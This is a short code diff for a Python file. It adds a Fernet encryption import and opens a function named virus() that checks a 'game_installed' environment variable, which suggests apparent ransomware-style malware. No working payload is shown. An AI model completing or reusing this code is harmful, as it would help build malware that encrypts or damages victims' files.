@@ -2,7 +2,7 @@ import os
 import random
 import pathlib
 import time
-  
+from cryptography.fernet import Fernet
 ############################################################################################################################################################
 def virus():
 	gameadded = os.getenv("game_installed")
